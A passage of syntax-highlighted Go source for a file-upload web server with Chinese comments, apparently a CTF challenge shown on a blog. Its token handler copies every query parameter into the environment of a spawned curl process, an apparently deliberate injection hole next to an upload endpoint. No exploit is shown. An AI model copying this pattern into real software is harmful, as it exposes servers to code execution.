</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75af00>fromHost</span> <span style=color:#f92672>:=</span> <span style=color:#d88200>&#34;&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>fromHostList</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>fromHost</span> <span style=color:#111>=</span> <span style=color:#75af00>fromHostList</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>Header</span><span style=color:#111>.</span><span style=color:#75af00>Set</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Fromhost&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>fromHost</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>command</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>exec</span><span style=color:#111>.</span><span style=color:#75af00>Command</span><span style=color:#111>(</span><span style=color:#d88200>&#34;curl&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;-H&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;Fromhost: &#34;</span><span style=color:#f92672>+</span><span style=color:#75af00>fromHost</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;127.0.0.1:9091&#34;</span><span style=color:#111>)</span>	<span style=color:#75715e>// 本地curl访问9091
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#00a8c8>for</span> <span style=color:#75af00>k</span><span style=color:#111>,</span> <span style=color:#75af00>_</span> <span style=color:#f92672>:=</span> <span style=color:#00a8c8>range</span> <span style=color:#75af00>values</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Env</span> <span style=color:#111>=</span> <span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Env</span><span style=color:#111>,</span> <span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Sprintf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;%s=%s&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>k</span><span style=color:#111>,</span> <span style=color:#75af00>values</span><span style=color:#111>.</span><span style=color:#75af00>Get</span><span style=color:#111>(</span><span style=color:#75af00>k</span><span style=color:#111>)))</span> <span style=color:#75715e>//获取环境变量 将参数键值对形式设为环境变量
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>outinfo</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>bytes</span><span style=color:#111>.</span><span style=color:#75af00>Buffer</span><span style=color:#111>{}</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>outerr</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>bytes</span><span style=color:#111>.</span><span style=color:#75af00>Buffer</span><span style=color:#111>{}</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Stdout</span> <span style=color:#111>=</span> <span style=color:#f92672>&amp;</span><span style=color:#75af00>outinfo</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Stderr</span> <span style=color:#111>=</span> <span style=color:#f92672>&amp;</span><span style=color:#75af00>outerr</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Start</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// res := &#34;ERROR&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Println</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>.</span><span style=color:#75af00>Error</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>res</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>TokenResult</span><span style=color:#111>{}</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#111>=</span> <span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Wait</span><span style=color:#111>();</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>Failed</span> <span style=color:#111>=</span> <span style=color:#75af00>outerr</span><span style=color:#111>.</span><span style=color:#75af00>String</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>Success</span> <span style=color:#111>=</span> <span style=color:#75af00>outinfo</span><span style=color:#111>.</span><span style=color:#75af00>String</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>msg</span><span style=color:#111>,</span> <span style=color:#75af00>_</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>json</span><span style=color:#111>.</span><span style=color:#75af00>Marshal</span><span style=color:#111>(</span><span style=color:#75af00>res</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>w</span><span style=color:#111>.</span><span style=color:#75af00>Write</span><span style=color:#111>(</span><span style=color:#75af00>msg</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>type</span> <span style=color:#75af00>ListFileResult</span> <span style=color:#00a8c8>struct</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>Files</span> <span style=color:#111>[]</span><span style=color:#00a8c8>string</span> <span style=color:#75af00>json</span><span style=color:#111>:</span><span style=color:#d88200>&#34;files&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 查看当前 token 下的文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>func</span> <span style=color:#75af00>listFile</span><span style=color:#111>(</span><span style=color:#75af00>w</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ResponseWriter</span><span style=color:#111>,</span> <span style=color:#75af00>r</span> <span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Request</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>values</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>URL</span><span style=color:#111>.</span><span style=color:#75af00>Query</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>token</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>values</span><span style=color:#111>.</span><span style=color:#75af00>Get</span><span style=color:#111>(</span><span style=color:#d88200>&#34;token&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>fromHostList</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>strings</span><span style=color:#111>.</span><span style=color:#75af00>Split</span><span style=color:#111>(</span><span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>RemoteAddr</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;:&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>fromHost</span> <span style=color:#f92672>:=</span> <span style=color:#d88200>&#34;&#34;</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>fromHostList</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>fromHost</span> <span style=color:#111>=</span> <span style=color:#75af00>fromHostList</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 验证token
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#00a8c8>if</span> <span style=color:#75af00>token</span> <span style=color:#f92672>!=</span> <span style=color:#d88200>&#34;&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>checkToken</span><span style=color:#111>(</span><span style=color:#75af00>token</span><span style=color:#111>,</span> <span style=color:#75af00>fromHost</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>dir</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>filepath</span><span style=color:#111>.</span><span style=color:#75af00>Join</span><span style=color:#111>(</span><span style=color:#d88200>&#34;uploads&#34;</span><span style=color:#111>,</span><span style=color:#75af00>token</span><span style=color:#111>)</span>  <span style=color:#75715e>// 带着token获取已经上传的文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75af00>files</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>ioutil</span><span style=color:#111>.</span><span style=color:#75af00>ReadDir</span><span style=color:#111>(</span><span style=color:#75af00>dir</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>			<span style=color:#00a8c8>var</span> <span style=color:#75af00>fs</span> <span style=color:#111>[]</span><span style=color:#00a8c8>string</span>
</span></span><span style=display:flex><span>			<span style=color:#00a8c8>for</span> <span style=color:#75af00>_</span><span style=color:#111>,</span> <span style=color:#75af00>f</span> <span style=color:#f92672>:=</span> <span style=color:#00a8c8>range</span> <span style=color:#75af00>files</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>				<span style=color:#75af00>fs</span> <span style=color:#111>=</span> <span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#75af00>fs</span><span style=color:#111>,</span> <span style=color:#75af00>f</span><span style=color:#111>.</span><span style=color:#75af00>Name</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span>			<span style=color:#111>}</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>msg</span><span style=color:#111>,</span> <span style=color:#75af00>_</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>json</span><span style=color:#111>.</span><span style=color:#75af00>Marshal</span><span style=color:#111>(</span><span style=color:#75af00>ListFileResult</span><span style=color:#111>{</span><span style=color:#75af00>Files</span><span style=color:#111>:</span> <span style=color:#75af00>fs</span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>w</span><span style=color:#111>.</span><span style=color:#75af00>Write</span><span style=color:#111>(</span><span style=color:#75af00>msg</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>		<span style=color:#111>}</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>type</span> <span style=color:#75af00>UploadFileResult</span> <span style=color:#00a8c8>struct</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>Code</span> <span style=color:#00a8c8>string</span> <span style=color:#75af00>json</span><span style=color:#111>:</span><span style=color:#d88200>&#34;code&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>uploadFile</span><span style=color:#111>(</span><span style=color:#75af00>w</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ResponseWriter</span><span style=color:#111>,</span> <span style=color:#75af00>r</span> <span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Request</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>if</span> <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>Method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;GET&#34;</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Fprintf</span><span style=color:#111>(</span><span style=color:#75af00>w</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;get&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>values</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>URL</span><span style=color:#111>.</span><span style=color:#75af00>Query</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>token</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>values</span><span style=color:#111>.</span><span style=color:#75af00>Get</span><span style=color:#111>(</span><span style=color:#d88200>&#34;token&#34;</span><span style=color:#111>)</span>	<span style=color:#75715e>// get方式传入token参数
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#75af00>fromHostList</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>strings</span><span style=color:#111>.</span><span style=color:#75af00>Split</span><span style=color:#111>(</span><span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>RemoteAddr</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;:&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>fromHost</span> <span style=color:#f92672>:=</span> <span style=color:#d88200>&#34;&#34;</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>fromHostList</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>fromHost</span> <span style=color:#111>=</span> <span style=color:#75af00>fromHostList</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>		<span style=color:#111>}</span>
</span></span><span style=display:flex><span>		<span style=color:#75715e>// 验证token
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#00a8c8>if</span> <span style=color:#75af00>token</span> <span style=color:#f92672>!=</span> <span style=color:#d88200>&#34;&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>checkToken</span><span style=color:#111>(</span><span style=color:#75af00>token</span><span style=color:#111>,</span> <span style=color:#75af00>fromHost</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>dir</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>filepath</span><span style=color:#111>.</span><span style=color:#75af00>Join</span><span style=color:#111>(</span><span style=color:#d88200>&#34;uploads&#34;</span><span style=color:#111>,</span><span style=color:#75af00>token</span><span style=color:#111>)</span> <span style=color:#75715e>// 将获取到的token新建文件夹
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			<span style=color:#00a8c8>if</span> <span style=color:#75af00>_</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>os</span><span style=color:#111>.</span><span style=color:#75af00>Stat</span><span style=color:#111>(</span><span style=color:#75af00>dir</span><span style=color:#111>);</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>				<span style=color:#75af00>os</span><span style=color:#111>.</span><span style=color:#75af00>MkdirAll</span><span style=color:#111>(</span><span style=color:#75af00>dir</span><span style=color:#111>,</span> <span style=color:#ae81ff>0766</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>			<span style=color:#111>}</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>files</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>ioutil</span><span style=color:#111>.</span><span style=color:#75af00>ReadDir</span><span style=color:#111>(</span><span style=color:#75af00>dir</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>			<span style=color:#00a8c8>if</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>files</span><span style=color:#111>)</span> <span style=color:#111>&gt;</span> <span style=color:#ae81ff>5</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>				<span style=color:#75af00>command</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>exec</span><span style=color:#111>.</span><span style=color:#75af00>Command</span><span style=color:#111>(</span><span style=color:#d88200>&#34;curl&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;127.0.0.1:9091/manage&#34;</span><span style=color:#111>)</span> <span style=color:#75715e>// 如果文件大于五个 则本地访问9091/manage删除所有文件
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>				<span style=color:#75af00>command</span><span style=color:#111>.</span><span style=color:#75af00>Start</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>			<span style=color:#111>}</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>ParseMultipartForm</span><span style=color:#111>(</span><span style=color:#ae81ff>32</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>20</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>file</span><span style=color:#111>,</span> <span style=color:#75af00>_</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>r</span><span style=color:#111>.</span><span style=color:#75af00>FormFile</span><span style=color:#111>(</span><span style=color:#d88200>&#34;file&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>			<span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>				<span style=color:#75af00>msg</span><span style=color:#111>,</span> <span style=color:#75af00>_</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>json</span><span style=color:#111>.</span><span style=color:#75af00>Marshal</span><span style=color:#111>(</span><span style=color:#75af00>UploadFileResult</span><span style=color:#111>{</span><span style=color:#75af00>Code</span><span style=color:#111>:</span> <span style=color:#75af00>err</span><span style=color:#111>.</span><span style=color:#75af00>Error</span><span style=color:#111>()})</span>
</span></span><span style=display:flex><span>				<span style=color:#75af00>w</span><span style=color:#111>.</span><span style=color:#75af00>Write</span><span style=color:#111>(</span><span style=color:#75af00>msg</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>				<span style=color:#00a8c8>return</span>
</span></span><span style=display:flex><span>			<span style=color:#111>}</span>
</span></span><span style=display:flex><span>			<span style=color:#00a8c8>defer</span> <span style=color:#75af00>file</span><span style=color:#111>.</span><span style=color:#75af00>Close</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>fileName</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>RandStringBytes</span><span style=color:#111>(</span><span style=color:#ae81ff>5</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>f</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>os</span><span style=color:#111>.</span><span style=color:#75af00>OpenFile</span><span style=color:#111>(</span><span style=color:#75af00>filepath</span><span style=color:#111>.</span><span style=color:#75af00>Join</span><span style=color:#111>(</span><span style=color:#75af00>dir</span><span style=color:#111>,</span> <span style=color:#75af00>fileName</span><span style=color:#111>),</span> <span style=color:#75af00>os</span><span style=color:#111>.</span><span style=color:#75af00>O_WRONLY</span><span style=color:#111>|</span><span style=color:#75af00>os</span><span style=color:#111>.</span><span style=color:#75af00>O_CREATE</span><span style=color:#111>,</span> <span style=color:#ae81ff>0666</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>			<span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>				<span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Println</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>				<span style=color:#00a8c8>return</span>
</span></span><span style=display:flex><span>			<span style=color:#111>}</span>
</span></span><span style=display:flex><span>			<span style=color:#00a8c8>defer</span> <span style=color:#75af00>f</span><span style=color:#111>.</span><span style=color:#75af00>Close</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>io</span><span style=color:#111>.</span><span style=color:#75af00>Copy</span><span style=color:#111>(</span><span style=color:#75af00>f</span><span style=color:#111>,</span> <span style=color:#75af00>file</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>msg</span><span style=color:#111>,</span> <span style=color:#75af00>_</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>json</span><span style=color:#111>.</span><span style=color:#75af00>Marshal</span><span style=color:#111>(</span><span style=color:#75af00>UploadFileResult</span><span style=color:#111>{</span><span style=color:#75af00>Code</span><span style=color:#111>:</span> <span style=color:#75af00>fileName</span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>w</span><span style=color:#111>.</span><span style=color:#75af00>Write</span><span style=color:#111>(</span><span style=color:#75af00>msg</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>		<span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>msg</span><span style=color:#111>,</span> <span style=color:#75af00>_</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>json</span><span style=color:#111>.</span><span style=color:#75af00>Marshal</span><span style=color:#111>(</span><span style=color:#75af00>UploadFileResult</span><span style=color:#111>{</span><span style=color:#75af00>Code</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;ERROR TOKEN&#34;</span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>			<span style=color:#75af00>w</span><span style=color:#111>.</span><span style=color:#75af00>Write</span><span style=color:#111>(</span><span style=color:#75af00>msg</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>		<span style=color:#111>}</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>checkToken</span><span style=color:#111>(</span><span style=color:#75af00>token</span><span style=color:#111>,</span> <span style=color:#75af00>ip</span> <span style=color:#00a8c8>string</span><span style=color:#111>)</span> <span style=color:#00a8c8>bool</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>data</span> <span style=color:#f92672>:=</span> <span style=color:#111>[]</span><span style=color:#111>byte</span><span style=color:#111>(</span><span style=color:#75af00>SecretKey</span> <span style=color:#f92672>+</span> <span style=color:#75af00>ip</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>has</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>md5</span><span style=color:#111>.</span><span style=color:#75af00>Sum</span><span style=color:#111>(</span><span style=color:#75af00>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>md5str</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Sprintf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;%x&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>has</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#75af00>md5str</span> <span style=color:#f92672>==</span> <span style=color:#75af00>token</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>IndexHandler</span> <span style=color:#111>(</span><span style=color:#75af00>w</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ResponseWriter</span><span style=color:#111>,</span> <span style=color:#75af00>r</span> <span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Request</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ServeFile</span><span style=color:#111>(</span><span style=color:#75af00>w</span><span style=color:#111>,</span> <span style=color:#75af00>r</span><span style=color:#111>,</span><span style=color:#d88200>&#34;dist/index.html&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>func</span> <span style=color:#75af00>main</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>file</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>os</span><span style=color:#111>.</span><span style=color:#75af00>Open</span><span style=color:#111>(</span><span style=color:#d88200>&#34;secret/key&#34;</span><span style=color:#111>)</span>	<span style=color:#75715e>// 读secret/key
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#111>panic</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>defer</span> <span style=color:#75af00>file</span><span style=color:#111>.</span><span style=color:#75af00>Close</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>content</span><span style=color:#111>,</span> <span style=color:#75af00>err</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>ioutil</span><span style=color:#111>.</span><span style=color:#75af00>ReadAll</span><span style=color:#111>(</span><span style=color:#75af00>file</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>SecretKey</span> <span style=color:#111>=</span> <span style=color:#111>string</span><span style=color:#111>(</span><span style=color:#75af00>content</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>HandleFunc</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>IndexHandler</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>fs</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>FileServer</span><span style=color:#111>(</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Dir</span><span style=color:#111>(</span><span style=color:#d88200>&#34;dist/static&#34;</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Handle</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/static/&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>StripPrefix</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/static/&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>fs</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>HandleFunc</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/token&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>getToken</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>HandleFunc</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/upload&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>uploadFile</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>HandleFunc</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/list&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>listFile</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#75af00>log</span><span style=color:#111>.</span><span style=color:#75af00>Print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;start listen 9090&#34;</span><span style=color:#111>)</span>
